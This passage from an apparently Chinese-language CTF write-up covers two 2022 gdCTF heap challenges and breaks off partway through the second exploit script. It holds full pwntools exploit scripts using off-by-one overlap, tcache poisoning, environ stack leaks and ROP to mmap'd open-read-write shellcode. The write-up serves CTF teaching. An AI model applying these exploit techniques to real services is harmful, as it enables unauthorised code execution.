one的漏洞</p>\n<p><img src=\"/p/2022gdCTF-pwn/image-20220523090433714.png\" alt=\"image-20220523090433714\"></p>\n<p>最后的思路就是，通过off by one修改下一个堆块的size位置，构造堆块堆叠，接下来主要控制tacache bin的fd指针构造任意位置分配读写。</p>\n<p>能够实现任意位置读写之后，构造堆块进入unsortedbin，泄露main_arena的地址，从而泄露libc_base，通过偏移量算出environ的地址（libc地址中存放着environ变量，中存放着栈地址），再次构造堆块，分配到environ上面，泄露栈地址，最后，malloc执行的位置是在add函数，通过计算偏移修改add函数返回地址，写入ROP。</p>\n<p>有关ROP的构造，实验发现mmap只需要前4个参数为addr、size、7、34即可分配出一个可执行的目标地址。</p>\n<p>故构造ROP，分配一个0x23330000的地址作为写入shellcode的地址，最后调用<code>read(0,0x23330000,0x50)</code>写入orw</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">func</span>(<span class=\"params\">a, b, c, d</span>):</span><br><span class=\"line\">    pp = p64(pop_rdi) + p64(a)</span><br><span class=\"line\">    pp += p64(pop_rsi) + p64(b)</span><br><span class=\"line\">    pp += p64(pop_rdx_rcx_rbx) + p64(c) + p64(d) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> pp</span><br><span class=\"line\">p = func(<span class=\"number\">0x23330000</span>, <span class=\"number\">0x1000</span>, <span class=\"number\">7</span>, <span class=\"number\">34</span>) + p64(libc.sym[<span class=\"string\">&#x27;mmap&#x27;</span>])</span><br><span class=\"line\">p += func(<span class=\"number\">0</span>, <span class=\"number\">0x23330000</span>, <span class=\"number\">0x50</span>, <span class=\"number\">0</span>) + p64(libc.sym[<span class=\"string\">&#x27;read&#x27;</span>]) </span><br><span class=\"line\">p += p64(<span class=\"number\">0x23330000</span>)</span><br></pre></td></tr></table></figure>\n\n<p>有关ORW的构造</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">context(arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">sc = asm(shellcraft.<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./flag&#x27;</span>))</span><br><span class=\"line\">sc += asm(shellcraft.read(<span class=\"number\">6</span>, <span class=\"number\">0x23330000</span> + <span class=\"number\">0x300</span>, <span class=\"number\">0x30</span>))</span><br><span class=\"line\">sc += asm(shellcraft.write(<span class=\"number\">1</span>, <span class=\"number\">0x23330000</span> + <span class=\"number\">0x300</span>, <span class=\"number\">0x30</span>))</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"完整EXP\"><a href=\"#完整EXP\" class=\"headerlink\" title=\"完整EXP\"></a>完整EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># getIO = lambda : process([&#x27;./ld-2.31.so&#x27;, &#x27;./orz&#x27;], env=&#123;&#x27;LD_PRELOAD&#x27;: &#x27;./libc-2.31.so&#x27;&#125;)</span></span><br><span class=\"line\">getIO = <span class=\"keyword\">lambda</span> : remote(<span class=\"string\">&#x27;120.79.220.233&#x27;</span>, <span class=\"number\">45715</span>)</span><br><span class=\"line\">sc = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">io = getIO()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size, content</span>): </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Your choose which one?\\n&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>) </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;please input note size : &#x27;</span>, <span class=\"built_in\">str</span>(size)) </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;please input your note.\\n&#x27;</span>, content) </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add2</span>(<span class=\"params\">size, content</span>): </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Your choose which one?\\n&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>) </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;please input note size : &#x27;</span>, <span class=\"built_in\">str</span>(size)) </span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;please input your note.\\n&#x27;</span>, content) </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx, content</span>): </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Your choose which one?\\n&#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>) </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;please input note index.\\n&#x27;</span>, <span class=\"built_in\">str</span>(idx)) </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;please input new note.\\n&#x27;</span>, content) </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>): </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Your choose which one?\\n&#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>) </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;please input note index.\\n&#x27;</span>, <span class=\"built_in\">str</span>(idx)) </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>): </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Your choose which one?\\n&#x27;</span>, <span class=\"string\">&#x27;4&#x27;</span>) </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;please input note index.\\n&#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\">stack_offset = <span class=\"number\">0x120</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">    add(<span class=\"number\">0xb0</span>, <span class=\"string\">&#x27;aaaaaa&#x27;</span>) <span class=\"comment\"># 1 ~ 10</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">    delete(i)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    add(<span class=\"number\">0xb0</span>, <span class=\"string\">&#x27;aaaaa&#x27;</span>)</span><br><span class=\"line\">add2(<span class=\"number\">0xb0</span>, <span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">show(<span class=\"number\">7</span>)</span><br><span class=\"line\">libc_base = u64(io.recv(<span class=\"number\">8</span>)) - (<span class=\"number\">0x7f3a3e885d61</span> - <span class=\"number\">0x7f3a3e699000</span> )</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;libc_base:&#x27;</span>+<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\"></span><br><span class=\"line\">environ = <span class=\"number\">0x01EF600</span> + libc_base </span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;environ:&#x27;</span>+<span class=\"built_in\">hex</span>(environ))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 8</span></span><br><span class=\"line\">add(<span class=\"number\">0xb0</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 9</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 11 vuln</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 12 edit</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 13</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 14</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 15</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 16</span></span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">11</span>,<span class=\"string\">&#x27;a&#x27;</span> *<span class=\"number\">0x28</span>+<span class=\"string\">&#x27;\\xc1&#x27;</span>)</span><br><span class=\"line\">delete(<span class=\"number\">12</span>)</span><br><span class=\"line\">add(<span class=\"number\">0xb0</span>, <span class=\"string\">&#x27;aaaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 17</span></span><br><span class=\"line\">delete(<span class=\"number\">17</span>)</span><br><span class=\"line\">delete(<span class=\"number\">13</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">12</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(<span class=\"number\">0x31</span>)+p64(environ-<span class=\"number\">0x10</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 13</span></span><br><span class=\"line\">add2(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>) <span class=\"comment\"># 17</span></span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">17</span>)</span><br><span class=\"line\">io.recv(<span class=\"number\">16</span>)</span><br><span class=\"line\">stack_base = u64(io.recv(<span class=\"number\">8</span>)) <span class=\"comment\"># - 0x1f438 </span></span><br><span class=\"line\"></span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;stack_base:&#x27;</span>+<span class=\"built_in\">hex</span>(stack_base))</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x0000000000023b72</span> + libc_base</span><br><span class=\"line\">pop_rsi = libc_base + <span class=\"number\">0x000000000002604f</span></span><br><span class=\"line\">pop_rdx_rcx_rbx = libc_base + <span class=\"number\">0x00000000001025ad</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">func</span>(<span class=\"params\">a, b, c, d</span>):</span><br><span class=\"line\">    pp = p64(pop_rdi) + p64(a)</span><br><span class=\"line\">    pp += p64(pop_rsi) + p64(b)</span><br><span class=\"line\">    pp += p64(pop_rdx_rcx_rbx) + p64(c) + p64(d) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> pp</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class=\"line\">libc.address = libc_base</span><br><span class=\"line\">flag_path = <span class=\"string\">&#x27;/home/pwn/flag\\x00&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">flag_path_addr = stack_base + <span class=\"number\">0x150</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 18</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 19</span></span><br><span class=\"line\">delete(<span class=\"number\">19</span>)</span><br><span class=\"line\">delete(<span class=\"number\">18</span>)</span><br><span class=\"line\">delete(<span class=\"number\">13</span>)</span><br><span class=\"line\">edit(<span class=\"number\">12</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(<span class=\"number\">0x31</span>)+p64(flag_path_addr))</span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 13</span></span><br><span class=\"line\">add2(<span class=\"number\">0x28</span>, flag_path) <span class=\"comment\"># 18</span></span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">12</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(<span class=\"number\">0xc1</span>))</span><br><span class=\"line\">add(<span class=\"number\">0xb0</span>, <span class=\"string\">&#x27;aaaaa&#x27;</span>) <span class=\"comment\"># 19</span></span><br><span class=\"line\">delete(<span class=\"number\">19</span>)</span><br><span class=\"line\">delete(<span class=\"number\">13</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add_ret =  stack_base - stack_offset</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">12</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(<span class=\"number\">0xc1</span>) + p64(add_ret))</span><br><span class=\"line\">add(<span class=\"number\">0xb0</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 13</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p = func(<span class=\"number\">0x23330000</span>, <span class=\"number\">0x1000</span>, <span class=\"number\">7</span>, <span class=\"number\">34</span>) + p64(libc.sym[<span class=\"string\">&#x27;mmap&#x27;</span>])</span><br><span class=\"line\">p += func(<span class=\"number\">0</span>, <span class=\"number\">0x23330000</span>, <span class=\"number\">0x50</span>, <span class=\"number\">0</span>) + p64(libc.sym[<span class=\"string\">&#x27;read&#x27;</span>]) </span><br><span class=\"line\">p += p64(<span class=\"number\">0x23330000</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;len:&#x27;</span> + <span class=\"built_in\">hex</span>(<span class=\"built_in\">len</span>(p)))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0xb0</span>, p)</span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> sc == <span class=\"string\">&#x27;&#x27;</span>:</span><br><span class=\"line\">    sc = asm(shellcraft.<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./flag&#x27;</span>))</span><br><span class=\"line\">    sc += asm(shellcraft.read(<span class=\"number\">6</span>, <span class=\"number\">0x23330000</span> + <span class=\"number\">0x300</span>, <span class=\"number\">0x30</span>))</span><br><span class=\"line\">    sc += asm(shellcraft.write(<span class=\"number\">1</span>, <span class=\"number\">0x23330000</span> + <span class=\"number\">0x300</span>, <span class=\"number\">0x30</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\">time.sleep(<span class=\"number\">0.2</span>)</span><br><span class=\"line\">io.send(sc)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive() </span><br></pre></td></tr></table></figure>\n\n<h1 id=\"easyheap\"><a href=\"#easyheap\" class=\"headerlink\" title=\"easyheap\"></a>easyheap</h1><h2 id=\"题目-2\"><a href=\"#题目-2\" class=\"headerlink\" title=\"题目\"></a>题目</h2><p><a href=\"https://gitee.com/csomebro/ctftask/blob/master/2022-05_gdCTF/easyheap.zip\">https://gitee.com/csomebro/ctftask/blob/master/2022-05_gdCTF/easyheap.zip</a></p>\n<h2 id=\"解题思路-2\"><a href=\"#解题思路-2\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h2><p>主要漏洞在，v3局部变量可能未初始化，可以提前布置栈帧，达到任意位置写入堆地址</p>\n<p><img src=\"/p/2022gdCTF-pwn/image-20220524094853062.png\" alt=\"image-20220524094853062\"></p>\n<p>以及还有一个backdoor函数，可以堆上任意写8字节（虽然只有一次，但利用上边的漏洞可以无限次）</p>\n<p>利用house of orange，修改_IO_2_stdout_，泄露libc_base，再次利用泄露environ地址，栈地址，heap基址</p>\n<p>之后利用修改tcachebin上的fd指针，参考midpwn的解法，修改add函数的返回地址，写入orw ROP，获得flag</p>\n<h2 id=\"Exp\"><a href=\"#Exp\" class=\"headerlink\" title=\"Exp\"></a>Exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> ctypes</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">context(arch=<span class=\"string\">&quot;amd64&quot;</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">getIO = <span class=\"keyword\">lambda</span>:process([<span class=\"string\">&#x27;./ld-2.31.so&#x27;</span>, <span class=\"string\">&#x27;./easyheap&#x27;</span>], env=&#123;<span class=\"string\">&#x27;LD_PRELOAD&#x27;</span>: <span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>&#125;)</span><br><span class=\"line\">io = getIO()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size, cont</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;4.delete\\n&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Size?\\n&#x27;</span>, <span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;Context:\\n&#x27;</span>, cont)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add2</span>(<span class=\"params\">size, offset, cont</span>):</span><br><span class=\"line\">    pp = <span class=\"string\">&#x27;1\\x00&#x27;</span></span><br><span class=\"line\">    pp += <span class=\"string\">&#x27;\\x00&#x27;</span> * (<span class=\"number\">12</span> - <span class=\"built_in\">len</span>(pp))</span><br><span class=\"line\">    pp += p32(ctypes.c_uint32(offset).value)</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;4.delete\\n&#x27;</span>, pp)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Size?\\n&#x27;</span>, <span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Context:\\n&#x27;</span>, cont)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add3</span>(<span class=\"params\">size, offset, cont</span>):</span><br><span class=\"line\">    pp = <span class=\"string\">&#x27;1\\x00&#x27;</span></span><br><span class=\"line\">    pp += <span class=\"string\">&#x27;\\x00&#x27;</span> * (<span class=\"number\">12</span> - <span class=\"built_in\">len</span>(pp))</span><br><span class=\"line\">    pp += p32(ctypes.c_uint32(offset).value)</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;4.delete&#x27;</span>, pp)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Size?&#x27;</span>, <span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;Context:&#x27;</span>, cont)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx, cont</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;4.delete\\n&#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Idx?\\n&#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Context:\\n&#x27;</span>, cont)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit2</span>(<span class=\"params\">idx, cont</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;4.delete&#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Idx?&#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;Context:&#x27;</span>, cont)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">backdoor</span>(<span class=\"params\">size, offset, cont</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;4.delete\\n&#x27;</span>, <span class=\"string\">&#x27;666&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Size?\\n&#x27;</span>, <span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Offset?\\n&#x27;</span>, <span class=\"built_in\">str</span>(offset))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;Context:\\n&#x27;</span>, cont)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">backdoor2</span>(<span class=\"params\">size, offset, cont</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;4.delete&#x27;</span>, <span class=\"string\">&#x27;666&#x27;</span>)</span><br><span 